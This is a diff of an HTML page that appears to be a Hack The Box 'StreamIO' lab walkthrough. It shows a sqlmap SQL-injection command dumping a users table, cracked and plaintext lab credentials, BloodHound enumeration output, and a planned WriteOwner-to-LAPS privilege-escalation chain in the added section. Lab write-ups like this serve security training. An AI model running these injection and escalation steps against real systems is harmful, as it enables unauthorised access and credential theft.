@@ -361,20 +361,30 @@ I selected those usernames where <strong>is_staff</strong> is set to <strong>0</
 <p>It only returned one username... <strong>admin</strong> and I retrieved the password, probably MD5 <strong>665a50ac9eaa781e4f7f04199db97a11</strong>. Crackstation revealed the password <strong>paddpadd</strong>. The login with those credentials still fails.
 So we dump all usernames, limiting the dumped characters to 10 chars. This took around 30 minutes.</p>
 <div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> -D STREAMIO -T users -C username --dump --batch --time-sec <span class="m">1</span> --last <span class="m">10</span>
-Database: STREAMIO                                                                                                                                                         Table: users                                                                                                                                                               <span class="o">[</span><span class="m">30</span> entries<span class="o">]</span>                                                                                                                                                               +-----------+                                                                                                                                                              <span class="p">|</span> username  <span class="p">|</span>                                                                                                                                                              +-----------+                                                                                                                                                              <span class="p">|</span> James     <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Theodore  <span class="p">|</span>
+Database: STREAMIO
+Table: users
+<span class="o">[</span><span class="m">30</span> entries<span class="o">]</span>
++-----------+
+<span class="p">|</span> username  <span class="p">|</span>
++-----------+
+<span class="p">|</span> James     <span class="p">|</span>
+<span class="p">|</span> Theodore  <span class="p">|</span>
 <span class="p">|</span> Samantha  <span class="p">|</span>
 <span class="p">|</span> Lauren    <span class="p">|</span>
 <span class="p">|</span> William   <span class="p">|</span>
 <span class="p">|</span> Sabrina   <span class="p">|</span>
 <span class="p">|</span> Robert    <span class="p">|</span>
 <span class="p">|</span> Thane     <span class="p">|</span>
-<span class="p">|</span> Carmon    <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Barry     <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Oliver    <span class="p">|</span>
+<span class="p">|</span> Carmon    <span class="p">|</span>
+<span class="p">|</span> Barry     <span class="p">|</span>
+<span class="p">|</span> Oliver    <span class="p">|</span>
 <span class="p">|</span> Michelle  <span class="p">|</span>
 <span class="p">|</span> Gloria    <span class="p">|</span>
 <span class="p">|</span> Victoria  <span class="p">|</span>
 <span class="p">|</span> Alexendra <span class="p">|</span>
 <span class="p">|</span> Baxter    <span class="p">|</span>
-<span class="p">|</span> Clara     <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> Barbra    <span class="p">|</span>
+<span class="p">|</span> Clara     <span class="p">|</span>
+<span class="p">|</span> Barbra    <span class="p">|</span>
 <span class="p">|</span> Lenord    <span class="p">|</span>
 <span class="p">|</span> Austin    <span class="p">|</span>
 <span class="p">|</span> Garfield  <span class="p">|</span>
@@ -385,7 +395,9 @@ Database: STREAMIO                                                              
 <span class="p">|</span> Diablo    <span class="p">|</span>
 <span class="p">|</span> Robin     <span class="p">|</span>
 <span class="p">|</span> Stan      <span class="p">|</span>
-<span class="p">|</span> yoshihide <span class="p">|</span>                                                                                                                                                              <span class="p">|</span> admin     <span class="p">|</span>                                                                                                                                                              +-----------+
+<span class="p">|</span> yoshihide <span class="p">|</span>
+<span class="p">|</span> admin     <span class="p">|</span>
++-----------+
 </code></pre></div>
 
 <p>Now i could dump all passwords, respectivly the MD5 hashes, but I try another way first.</p>
@@ -569,6 +581,32 @@ SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>   
 </code></pre></div>
 
 <p>And we are lucky. <strong>JDgodd</strong> has the password <strong>JDg0dd1s@d0p3cr3@t0r</strong>.</p>
+<p>But JDgodd can't login over WinRM. Time to enumerate all those permissions in Active Directory. Who can do this best? You guess, right, it's BloodHound.
+I am using <code>bloodhound-python</code> to retrieve the data even though I know it retrieves fewer data than SharpHound for example.</p>
+<div class="highlight"><pre><span></span><code>bloodhound-python -c All -u nikk37 -p <span class="s2">&quot;get_dem_girls2@yahoo.com&quot;</span> -d streamio.htb -ns <span class="nv">$TIP</span>
+INFO: Found AD domain: streamio.htb
+INFO: Connecting to LDAP server: dc.streamio.htb
+INFO: Found <span class="m">1</span> domains
+INFO: Found <span class="m">1</span> domains <span class="k">in</span> the forest
+INFO: Found <span class="m">1</span> computers
+INFO: Connecting to LDAP server: dc.streamio.htb
+INFO: Found <span class="m">8</span> users
+INFO: Connecting to GC LDAP server: dc.streamio.htb
+INFO: Found <span class="m">54</span> groups
+INFO: Found <span class="m">0</span> trusts
+INFO: Starting computer enumeration with <span class="m">10</span> workers
+INFO: Querying computer: DC.streamIO.htb
+INFO: Done <span class="k">in</span> 00M 05S
+</code></pre></div>
+
+<p>Generally, I would have used <code>bloodhound-import</code>, but it does not work with the newest Bloodhound format right now. Instead, I use the drag-and-drop feature of Bloodhound to import those JSON files to the neo4j database.
+BloodHound is a a great tool. At first, I display all those in the "Administrators" group. We can see <strong>Martin</strong> sitting there, waiting to be hacked. And we take a look on all those other users. <strong>nikk37</strong> is, who would expected that, in the <strong>Remote Users</strong> group, but nothing else is special about that account. <strong>yoshihide</strong> is neither interesting, no exiting groups or permissions. Different for <strong>JDgodd</strong>, this account not member of the <strong>Core Staff</strong> group, but has <strong>WriteOwner</strong> permission. This means that account, which we already have access to, can set the owner of that group. And we now what the owner can do...</p>
+<p>Even better, the <strong>Core Staff</strong> group has the <strong>ReadLAPSPassoword</strong> permission for the DC host, respectivly our target ;)</p>
+<p>What are our next steps?
+1. Set the owner of <strong>Core Staff</strong> group to any user we own, by using JDgodd
+2. Add an account, we own, to the <strong>Core Staff</strong> group using the group owner, we set just before
+3. Use the newly added <strong>Core Staff</strong> account to read the LAPS password for the DC
+4. SUCCESS</p>
   </div>
   <div class="tag-cloud">
     <p>
